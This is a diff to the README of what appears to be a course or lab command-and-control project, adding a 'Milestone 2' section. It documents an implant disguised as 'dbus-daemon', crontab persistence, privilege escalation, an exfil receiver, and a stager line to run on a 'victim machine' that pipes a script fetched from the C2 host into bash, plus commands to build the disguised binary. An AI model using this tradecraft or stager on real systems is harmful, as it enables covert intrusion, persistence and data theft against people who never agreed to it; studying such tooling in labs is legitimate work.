@@ -38,6 +38,41 @@ The video first shows the C2 server starting up with no active implant connectio
 ## Exploit Flow Diagram
 ![Exploit Flow](docs/exploit_flow.png)
 
+## Milestone 2 C2 Infrastructure
+
+### What was added
+
+| Feature | Details |
+|---|---|
+| TLS on implant channel | Ephemeral self-signed cert generated at C2 startup - all implant traffic on port 9999 is TLS encrypted |
+| HTTPS staging server | Serves implant binary (`/b`) and stager script (`/s`) over HTTPS with decoy responses on all other paths |
+| Stripped ELF binary | Implant compiled with PyInstaller (`--onefile --noupx`) and `strip --strip-all`, named `dbus-daemon` to blend in |
+| RECON_BUNDLE | Single command runs multiple recon steps (whoami, kernel, network, processes, SUID bins, etc.) and returns combined report |
+| PERSIST | `@reboot` crontab entry |
+| PRIVESC | Enumerates sudo NOPASSWD, SUID bins, writable sudoers; attempts escalation; spawns new root implant session on success |
+| Operator reconnect | `op.py` reconnects automatically if C2 drops |
+
+### Stager delivery (Milestone 2 path)
+
+```bash
+# On victim machine - replace IP with your C2 host
+curl -fsSLk https://<C2_HOST>/s | bash
+```
+
+The stager downloads the pre-built `dbus-daemon` binary from the staging server, installs it to `~/.cache/.sysd/`, and executes it. The implant beacons to the C2 over TLS.
+
+### Building the implant binary
+
+The binary must be compiled on Linux (WSL works):
+
+```bash
+pyinstaller --onefile --noupx --name dbus-daemon \
+    --hidden-import ssl --hidden-import _ssl \
+    --collect-all cryptography \
+    implant_client.py
+cp dist/dbus-daemon milestone2/staging/dbus-daemon
+```
+
 ## Build & Run
 
 **Prerequisites:** Docker, Docker Compose
@@ -71,9 +106,9 @@ python op.py              # terminal 3 (after an implant connects)
 
 **Ports used:**
 
-| Port | Service         |
-|------|-----------------|
-| 9999 | Implant C2      |
-| 9998 | Operator API    |
-| 9090 | Exfil receiver  |
-| 8080 | Staging server  |
+| Port | Service                        |
+|------|--------------------------------|
+| 9999 | Implant C2 (TLS)               |
+| 9998 | Operator API (localhost only)  |
+| 9090 | Exfil receiver                 |
+| 443  | HTTPS staging server           |
